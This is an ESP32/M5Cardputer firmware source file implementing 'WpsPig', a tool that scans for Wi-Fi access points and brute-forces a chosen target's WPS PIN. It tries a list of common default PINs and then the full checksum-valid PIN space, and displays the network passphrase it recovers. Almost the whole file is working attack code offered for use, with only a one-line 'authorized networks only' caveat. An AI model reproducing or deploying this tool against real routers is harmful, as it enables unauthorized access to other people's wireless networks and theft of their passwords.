// WpsPig — WPS PIN brute-force
// Lab / authorized networks only.
//
// How it works:
//   1. WiFi.scanNetworks() finds APs that advertise WPS in their beacon IE.
//   2. User picks a target.
//   3. We iterate through the standard WPS PIN list (most common first, then
//      full 00000000-99999999 with valid checksum) using the official
//      esp_wifi_wps_enable(WPS_TYPE_PIN) + esp_wifi_wps_start() API.
//   4. Each attempt triggers WIFI_EVENT_STA_WPS_ER_SUCCESS (found!) or
//      WIFI_EVENT_STA_WPS_ER_FAILED / TIMEOUT (wrong pin, try next).
//   5. On success the event carries the SSID+password — we show them.
//
// No external library, no IDF internal hacks, compiles on espressif32@6.x.

#include "wps_pig.h"
#include <M5Cardputer.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wps.h>
#include <esp_event.h>
#include <string.h>

#include "../ui/display.h"
#include "../ui/keys.h"
#include "../audio/sfx.h"
#include "../core/config.h"
#include "../core/app.h"
#include "../cap/sniffer.h"

// ─── statics ─────────────────────────────────────────────────────────────────
bool WpsPigMode::s_running = false;

// ─── WPS PIN generation ───────────────────────────────────────────────────────
// WPS PIN is 8 digits where the 8th is a checksum of the first 7.
// Standard checksum algorithm (from WiFi Alliance WPS spec).
static uint8_t wpsChecksum(uint32_t pin7) {
    uint32_t accum = 0;
    accum += 3 * ((pin7 / 10000000) % 10);
    accum += 1 * ((pin7 / 1000000)  % 10);
    accum += 3 * ((pin7 / 100000)   % 10);
    accum += 1 * ((pin7 / 10000)    % 10);
    accum += 3 * ((pin7 / 1000)     % 10);
    accum += 1 * ((pin7 / 100)      % 10);
    accum += 3 * ((pin7 / 10)       % 10);
    return (uint8_t)((10 - (accum % 10)) % 10);
}

// Build null-terminated 8-char PIN string from 7-digit value
static void makePin(uint32_t pin7, char out[9]) {
    snprintf(out, 9, "%07lu%u", (unsigned long)pin7, wpsChecksum(pin7));
}

// ─── Well-known PINs to try first (vendor defaults, commonly leaked) ─────────
// Tried before the full brute-force sweep.
static const char* const KNOWN_PINS[] = {
    "12345670", "00000000", "11111111", "22222222", "33333333",
    "44444444", "55555555", "66666666", "77777777", "88888888",
    "99999999", "12340000", "00001234", "11110000", "00001111",
    "12341234", "11112222", "98765432", "00005678", "10000000",
};
static const uint8_t KNOWN_PINS_N = sizeof(KNOWN_PINS) / sizeof(KNOWN_PINS[0]);

// ─── AP scan result ───────────────────────────────────────────────────────────
struct WpsAP {
    uint8_t bssid[6];
    char    ssid[33];
    int8_t  rssi;
    uint8_t channel;
    bool    wps;        // WPS IE advertised
};

static const uint8_t AP_MAX  = 32;
static const uint8_t VISIBLE = 7;

static WpsAP   s_aps[AP_MAX];
static uint8_t s_apN   = 0;
static uint8_t s_sel   = 0;
static uint8_t s_scroll = 0;

// ─── Attack state ──────────────────────────────────────────────────────────────
enum class WpsState : uint8_t {
    IDLE,
    SCANNING,
    SELECTING,      // user picks AP
    ATTACKING,      // brute-forcing
    SUCCESS,
    FAIL
};

static WpsState  s_state     = WpsState::IDLE;
static char      s_targetSsid[33]  = {};
static uint8_t   s_targetBssid[6] = {};
static uint8_t   s_targetCh  = 1;
static bool      s_keyWas = false;
static bool      s_swallowEnter = false;

// PIN iteration
static bool      s_inKnown   = true;    // true = trying KNOWN_PINS first
static uint8_t   s_knownIdx  = 0;
static uint32_t  s_pin7      = 0;       // current 7-digit value for brute-force
static char      s_currentPin[9] = {};
static uint32_t  s_tried     = 0;
static uint32_t  s_total     = 10000000UL + KNOWN_PINS_N; // known + 10M

// WPS event flag (wifi task writes, loop reads). 0=pending 1=ok -1=fail -2=timeout
static volatile int s_wpsResult = 0;
static bool         s_pinBusy   = false;
static bool         s_needPin   = true;
static uint32_t     s_pinStart  = 0;
static uint32_t     s_pinCool   = 0;
static constexpr uint32_t PIN_WAIT_MS = 3500;
static constexpr uint32_t PIN_COOL_MS = 80;

// Found credentials
static char s_foundSsid[33]  = {};
static char s_foundPass[65]  = {};

// Log ring
static const uint8_t LOG_MAX = 48;
static char   s_log[LOG_MAX][56];
static uint8_t s_logHead = 0, s_logN = 0;

static void logAdd(const char* fmt, ...) {
    va_list ap; va_start(ap, fmt);
    vsnprintf(s_log[s_logHead], sizeof(s_log[0]), fmt, ap);
    va_end(ap);
    s_logHead = (s_logHead + 1) % LOG_MAX;
    if (s_logN < LOG_MAX) s_logN++;
}

static const char* logGet(uint8_t i) {
    uint8_t base = (s_logHead + LOG_MAX - s_logN) % LOG_MAX;
    return s_log[(base + i) % LOG_MAX];
}

// ─── WPS event handler ────────────────────────────────────────────────────────
static void wpsEventHandler(void* /*arg*/, esp_event_base_t base,
                             int32_t id, void* data)
{
    if (base != WIFI_EVENT) return;
    switch (id) {
        case WIFI_EVENT_STA_WPS_ER_SUCCESS: {
            // data = pointer to wifi_event_sta_wps_er_success_t
            auto* evt = (wifi_event_sta_wps_er_success_t*)data;
            if (evt && evt->ap_cred_cnt > 0) {
                strncpy(s_foundSsid, (char*)evt->ap_cred[0].ssid,
                        sizeof(s_foundSsid) - 1);
                strncpy(s_foundPass, (char*)evt->ap_cred[0].passphrase,
                        sizeof(s_foundPass) - 1);
            } else {
                strncpy(s_foundSsid, s_targetSsid, sizeof(s_foundSsid) - 1);
                s_foundPass[0] = 0;
            }
            s_wpsResult = 1;
            break;
        }
        case WIFI_EVENT_STA_WPS_ER_FAILED:
        case WIFI_EVENT_STA_WPS_ER_TIMEOUT:
            s_wpsResult = (id == WIFI_EVENT_STA_WPS_ER_TIMEOUT) ? -2 : -1;
            break;
        default:
            break;
    }
}

static esp_event_handler_instance_t s_wpsEvtInst = nullptr;

static void finishPin() {
    if (s_pinBusy) esp_wifi_wps_disable();
    s_pinBusy = false;
    s_pinCool = (uint32_t)millis();
}

// Start one enrollee attempt. Does not wait. Loop polls s_wpsResult.
static bool beginPin() {
    wifi_config_t cfg = {};
    memcpy(cfg.sta.bssid, s_targetBssid, 6);
    cfg.sta.bssid_set = true;
    cfg.sta.channel   = s_targetCh;
    esp_wifi_set_config(WIFI_IF_STA, &cfg);

    esp_wps_config_t wpsCfg = {};
    wpsCfg.wps_type = WPS_TYPE_PIN;
    strncpy(wpsCfg.factory_info.manufacturer, "ESP32",
            sizeof(wpsCfg.factory_info.manufacturer) - 1);

    s_wpsResult = 0;
    if (esp_wifi_wps_enable(&wpsCfg) != ESP_OK) return false;
    if (esp_wifi_wps_start(0) != ESP_OK) {
        esp_wifi_wps_disable();
        return false;
    }
    s_pinBusy = true;
    s_pinStart = (uint32_t)millis();
    return true;
}

static bool enterDown() {
    return M5Cardputer.Keyboard.keysState().enter ||
           M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER);
}

// ─── Scan ─────────────────────────────────────────────────────────────────────
static void doScan() {
    s_apN = 0; s_sel = 0; s_scroll = 0;
    s_state = WpsState::SCANNING;
    logAdd("Scanning...");

    if (Cap::isRunning()) Cap::stop();
    WiFi.persistent(false);
    WiFi.setSleep(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
    delay(60);

    int n = WiFi.scanNetworks(false, true);
    if (n < 0) {
        logAdd("Scan fail %d", n);
        n = 0;
    }

    for (int i = 0; i < n && s_apN < AP_MAX; i++) {
        WpsAP& ap = s_aps[s_apN];
        String ss = WiFi.SSID(i);
        strncpy(ap.ssid, ss.c_str(), 32); ap.ssid[32] = 0;
        uint8_t* b = WiFi.BSSID(i);
        if (b) memcpy(ap.bssid, b, 6);
        else memset(ap.bssid, 0, 6);
        ap.rssi    = (int8_t)WiFi.RSSI(i);
        ap.channel = (uint8_t)WiFi.channel(i);
        ap.wps = true;
        s_apN++;
    }
    WiFi.scanDelete();
    for (uint8_t a = 0; a + 1 < s_apN; a++) {
        for (uint8_t b = 0; b + 1 < s_apN - a; b++) {
            if (s_aps[b].rssi < s_aps[b + 1].rssi) {
                WpsAP tmp = s_aps[b];
                s_aps[b] = s_aps[b + 1];
                s_aps[b + 1] = tmp;
            }
        }
    }
    logAdd(s_apN ? "Found %u APs" : "No networks found", s_apN);
    s_state = WpsState::SELECTING;
}

// ─── Advance to next PIN ──────────────────────────────────────────────────────
static bool nextPin() {
    if (s_inKnown) {
        if (s_knownIdx < KNOWN_PINS_N) {
            strncpy(s_currentPin, KNOWN_PINS[s_knownIdx++], 9);
            s_tried++;
            return true;
        }
        // switch to brute-force
        s_inKnown = false;
        s_pin7 = 0;
    }
    // brute-force: iterate 7-digit value, skip invalid checksums
    // (already baked into makePin — no skipping needed, all are valid)
    if (s_pin7 >= 10000000UL) return false; // exhausted
    makePin(s_pin7++, s_currentPin);
    s_tried++;
    return true;
}

// ─── UI drawing ───────────────────────────────────────────────────────────────
static void drawTopBar(M5Canvas& cv, const char* title) {
    cv.fillRect(0, 0, DISPLAY_W, TOP_BAR_H, UiStyle::PANEL);
    cv.setFont(&fonts::Font0); cv.setTextSize(1);
    cv.setTextColor(UiStyle::GOLD, UiStyle::PANEL);
    cv.setTextDatum(ML_DATUM);
    cv.drawString("WPS", 4, TOP_BAR_H / 2);
    cv.setTextColor(UiStyle::TITLE, UiStyle::PANEL);
    cv.setTextDatum(MC_DATUM);
    cv.drawString(title, DISPLAY_W / 2, TOP_BAR_H / 2);
    if (s_state == WpsState::ATTACKING) {
        char buf[16];
        uint8_t pct = (uint8_t)((uint64_t)s_tried * 100 / s_total);
        snprintf(buf, sizeof(buf), "%u%%", pct);
        cv.setTextColor(UiStyle::DIM, UiStyle::PANEL);
        cv.setTextDatum(MR_DATUM);
        cv.drawString(buf, DISPLAY_W - 4, TOP_BAR_H / 2);
    }
}

static void drawBottomBar(M5Canvas& cv, const char* hint) {
    int y = DISPLAY_H - BOTTOM_BAR_H;
    cv.fillRect(0, y, DISPLAY_W, BOTTOM_BAR_H, UiStyle::PANEL);
    cv.setFont(&fonts::Font0); cv.setTextSize(1);
    cv.setTextColor(UiStyle::DIM, UiStyle::PANEL);
    cv.setTextDatum(ML_DATUM);
    cv.drawString(hint, 4, y + BOTTOM_BAR_H / 2);
}

static void drawScanList(M5Canvas& cv) {
    drawTopBar(cv, s_state == WpsState::SCANNING ? "SCANNING..." : "SELECT AP");
    int y = TOP_BAR_H + 2;
    cv.setFont(&fonts::Font0); cv.setTextSize(1);
    if (s_apN == 0) {
        cv.setTextColor(UiStyle::DIM, UiStyle::BG);
        cv.setTextDatum(MC_DATUM);
        cv.drawString("NO NETS  ENTER:retry", DISPLAY_W/2, TOP_BAR_H + MAIN_H/2);
    } else {
        int visN = (int)s_apN - (int)s_scroll;
        if (visN > (int)VISIBLE) visN = (int)VISIBLE;
        if (visN < 0) visN = 0;
        for (uint8_t i = 0; i < visN; i++) {
            uint8_t idx = s_scroll + i;
            const WpsAP& ap = s_aps[idx];
            bool sel = (idx == s_sel);
            uint16_t bg = sel ? UiStyle::PINK  : UiStyle::BG;
            uint16_t fg = sel ? UiStyle::BG    : UiStyle::TEXT;
            cv.fillRect(0, y, DISPLAY_W, 14, bg);
            cv.setTextColor(fg, bg); cv.setTextDatum(ML_DATUM);
            char ssid[18]; snprintf(ssid, sizeof(ssid), "%.17s", ap.ssid[0] ? ap.ssid : "<hidden>");
            cv.drawString(ssid, 4, y + 7);
            char info[16]; snprintf(info, sizeof(info), "ch%u %ddBm", ap.channel, (int)ap.rssi);
            cv.setTextColor(sel ? UiStyle::BG : UiStyle::DIM, bg);
            cv.setTextDatum(MR_DATUM);
            cv.drawString(info, DISPLAY_W - 2, y + 7);
            y += 14;
        }
    }
    char hint[48];
    if (s_apN == 0)
        snprintf(hint, sizeof(hint), "ENTER:scan  ESC:back  BKSP:hide");
    else
        snprintf(hint, sizeof(hint), "%u/%u  ^/v ENT  ESC  BKSP",
                 s_apN ? s_sel+1 : 0, s_apN);
    drawBottomBar(cv, hint);
}

static void drawAttack(M5Canvas& cv) {
    bool done = (s_state == WpsState::SUCCESS || s_state == WpsState::FAIL);
    const char* title = s_state == WpsState::SUCCESS ? "CRACKED!" :
                        s_state == WpsState::FAIL     ? "NOT FOUND" :
                        "ATTACKING...";
    drawTopBar(cv, title);

    // Log lines
    int y = TOP_BAR_H + 2;
    uint8_t vis = (uint8_t)((MAIN_H - (s_state == WpsState::SUCCESS ? 20 : 2)) / 9);
    cv.setFont(&fonts::Font0); cv.setTextSize(1); cv.setTextDatum(ML_DATUM);
    uint8_t startLine = s_logN > vis ? s_logN - vis : 0;
    for (uint8_t i = 0; i < vis && i < s_logN; i++) {
        const char* line = logGet(startLine + i);
        bool hi = (s_state == WpsState::SUCCESS && i == vis - 1);
        cv.setTextColor(hi ? UiStyle::GREEN : UiStyle::TEXT, UiStyle::BG);
        cv.drawString(line, 2, y + 5);
        y += 9;
    }

    if (s_state == WpsState::SUCCESS) {
        cv.fillRect(0, DISPLAY_H - BOTTOM_BAR_H - 20, DISPLAY_W, 20, UiStyle::GREEN);
        cv.setTextColor(UiStyle::BG, UiStyle::GREEN);
        cv.setTextDatum(MC_DATUM);
        char buf[40];
        snprintf(buf, sizeof(buf), "PIN:%-8s  PASS:%.20s", s_currentPin, s_foundPass);
        cv.drawString(buf, DISPLAY_W / 2, DISPLAY_H - BOTTOM_BAR_H - 10);
        drawBottomBar(cv, "ESC:back  BKSP:hide");
    } else {
        // Current PIN progress bar
        uint8_t pct = (uint8_t)((uint64_t)s_tried * 100 / s_total);
        cv.fillRect(0, DISPLAY_H - BOTTOM_BAR_H - 6, DISPLAY_W * pct / 100, 4, UiStyle::CYAN);
        drawBottomBar(cv, done ? "ESC:back  BKSP:hide" : "ESC:stop  BKSP:hide");
    }
}

// ─── Public API ───────────────────────────────────────────────────────────────
void WpsPigMode::init() {
    s_running = false;
    s_state   = WpsState::IDLE;
    s_pinBusy = false;
}

static void attackTick() {
    uint32_t now = (uint32_t)millis();
    if (s_pinBusy) {
        int r = s_wpsResult;
        if (r == 0 && (uint32_t)(now - s_pinStart) < PIN_WAIT_MS) return;
        finishPin();
        if (r == 1) {
            logAdd("SUCCESS! PIN: %s", s_currentPin);
            if (s_foundPass[0]) logAdd("PASS: %s", s_foundPass);
            s_state = WpsState::SUCCESS;
            SFX::play(SFX::CONFIRM);
            return;
        }
        s_needPin = true;
    }
    if ((uint32_t)(now - s_pinCool) < PIN_COOL_MS) return;
    if (s_needPin) {
        if (!nextPin()) {
            logAdd("All PINs exhausted - not found");
            s_state = WpsState::FAIL;
            return;
        }
        logAdd("PIN %s (%lu/%lu)", s_currentPin, (unsigned long)s_tried, (unsigned long)s_total);
        s_needPin = false;
    }
    if (!beginPin()) {
        s_pinCool = now;
        return;
    }
}

void WpsPigMode::start() {
    s_running  = true;
    s_state    = WpsState::SELECTING;
    s_apN = 0; s_sel = 0; s_scroll = 0;
    s_logHead = 0; s_logN = 0;
    s_tried = 0; s_total = 10000000UL + KNOWN_PINS_N;
    s_foundSsid[0] = 0; s_foundPass[0] = 0;
    s_keyWas = true;
    s_swallowEnter = true;
    s_pinBusy = false;
    s_needPin = true;
    s_wpsResult = 0;

    if (s_wpsEvtInst) {
        esp_event_handler_instance_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, s_wpsEvtInst);
        s_wpsEvtInst = nullptr;
    }
    esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                        wpsEventHandler, nullptr, &s_wpsEvtInst);
    logAdd("WPS mode ready");
    doScan();
}

void WpsPigMode::stop() {
    finishPin();
    if (s_wpsEvtInst) {
        esp_event_handler_instance_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, s_wpsEvtInst);
        s_wpsEvtInst = nullptr;
    }
    WiFi.disconnect(false, false);
    s_running = false;
    s_state   = WpsState::IDLE;
}

void WpsPigMode::getStatusLine(char* out, size_t cap) {
    if (!out || !cap) return;
    if (s_state == WpsState::ATTACKING)
        strncpy(out, "ESC STOP  BKSP HIDE", cap - 1);
    else
        strncpy(out, "^/v ENT  ESC BACK  BKSP HIDE", cap - 1);
    out[cap - 1] = 0;
}

void WpsPigMode::update() {
    if (!s_running) return;

    if (s_state == WpsState::ATTACKING) {
        attackTick();
        if (s_state == WpsState::ATTACKING &&
            !App::windowHidden() &&
            keyNewPress(s_keyWas) && keyEsc()) {
            finishPin();
            logAdd("Stopped by user");
            s_state = WpsState::SELECTING;
            s_needPin = true;
        }
        return;
    }

    if (App::windowHidden()) return;

    if (s_swallowEnter) {
        if (enterDown()) return;
        s_swallowEnter = false;
    }

    if (!keyNewPress(s_keyWas)) return;

    if (keyEsc()) {
        if (s_state == WpsState::SUCCESS || s_state == WpsState::FAIL)
            s_state = WpsState::SELECTING;
        else
            stop();
        return;
    }

    if (s_state != WpsState::SELECTING) return;

    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
        if (s_sel > 0) { s_sel--; if (s_sel < s_scroll) s_scroll = s_sel; }
        return;
    }
    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
        if (s_sel + 1 < s_apN) {
            s_sel++;
            if (s_sel >= s_scroll + VISIBLE) s_scroll = s_sel - VISIBLE + 1;
        }
        return;
    }
    if (!enterDown()) return;

    if (s_apN == 0) {
        doScan();
        return;
    }
    const WpsAP& ap = s_aps[s_sel];
    strncpy(s_targetSsid, ap.ssid, sizeof(s_targetSsid) - 1);
    memcpy(s_targetBssid, ap.bssid, 6);
    s_targetCh  = ap.channel;
    s_tried     = 0;
    s_inKnown   = true;
    s_knownIdx  = 0;
    s_pin7      = 0;
    s_logHead   = 0; s_logN = 0;
    s_needPin   = true;
    s_pinBusy   = false;
    logAdd("Target: %.20s", s_targetSsid[0] ? s_targetSsid : "<hidden>");
    logAdd("Trying %u known PINs first", KNOWN_PINS_N);
    s_state = WpsState::ATTACKING;
}

void WpsPigMode::draw(M5Canvas& cv) {
    if (!s_running) return;
    cv.fillRect(0, 0, DISPLAY_W, DISPLAY_H, UiStyle::BG);
    if (s_state == WpsState::ATTACKING ||
        s_state == WpsState::SUCCESS   ||
        s_state == WpsState::FAIL) {
        drawAttack(cv);
    } else {
        drawScanList(cv);
    }
}
